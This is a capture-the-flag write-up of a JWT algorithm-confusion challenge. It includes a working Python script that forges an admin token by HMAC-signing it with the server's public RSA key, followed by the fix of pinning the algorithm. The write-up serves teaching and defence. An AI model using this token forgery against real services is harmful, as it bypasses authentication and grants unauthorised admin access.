# RSA or HMAC? (35 pts)

**Category:** JSON Web Tokens
**Difficulty:** Medium

---

## Challenge

The server accepts both RS256 (asymmetric) and HS256 (symmetric) algorithms. The public key is exposed.

**Endpoints:**
- `/rsa-or-hmac/create_session/<username>/` - Create RS256-signed session
- `/rsa-or-hmac/get_pubkey/` - Retrieve the public key
- `/rsa-or-hmac/authorise/<token>/` - Authorize with a token

---

## Vulnerability: Algorithm Confusion

The server verifies tokens using:

```python
jwt.decode(token, PUBLIC_KEY, algorithms=['HS256', 'RS256'])
```

This is vulnerable to **algorithm confusion**:
- **RS256**: Asymmetric. Signs with private key, verifies with public key.
- **HS256**: Symmetric. Signs AND verifies with the same secret.

If we change `alg` from RS256 to HS256, the server will use the public key (which we know) as the HMAC secret.

---

## Attack Flow

```
1. Attacker gets public key from /get_pubkey/
2. Attacker creates JWT with alg=HS256, admin=true
3. Attacker signs with HMAC using public key as secret
4. Server receives token, sees alg=HS256
5. Server verifies HMAC using public key as secret
6. Signature matches! Attacker gains admin access.
```

---

## Exploit

Modern PyJWT blocks using asymmetric keys for HMAC, so we need manual signing:

```python
import hmac
import hashlib
import base64
import json
import requests

def b64url_encode(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Get the public key
pubkey_resp = requests.get("https://web.cryptohack.org/rsa-or-hmac/get_pubkey/")
public_key = pubkey_resp.json()['pubkey']

# Build JWT with HS256
header = {"alg": "HS256", "typ": "JWT"}
payload = {"admin": True}

header_b64 = b64url_encode(header)
payload_b64 = b64url_encode(payload)
message = f"{header_b64}.{payload_b64}".encode()

# Sign with public key as HMAC secret
signature = hmac.new(public_key.encode(), message, hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()

token = f"{header_b64}.{payload_b64}.{sig_b64}"

# Get flag
url = f"https://web.cryptohack.org/rsa-or-hmac/authorise/{token}/"
response = requests.get(url)
print(response.json())
```

---

## Why PyJWT Blocks This

After CVE-2017-11424, PyJWT added protections:

```python
>>> jwt.encode({"admin": True}, public_key, algorithm="HS256")
InvalidKeyError: The specified key is an asymmetric key... this is not allowed
```

The server must be using an older version or has disabled this check.

---

## Mitigation

**Never allow algorithm negotiation.** Explicitly specify the expected algorithm:

```python
# SECURE - single algorithm, no negotiation
jwt.decode(token, PUBLIC_KEY, algorithms=['RS256'])

# INSECURE - allows algorithm confusion
jwt.decode(token, PUBLIC_KEY, algorithms=['HS256', 'RS256'])
```

Better yet, use separate keys and verification logic for different algorithms.
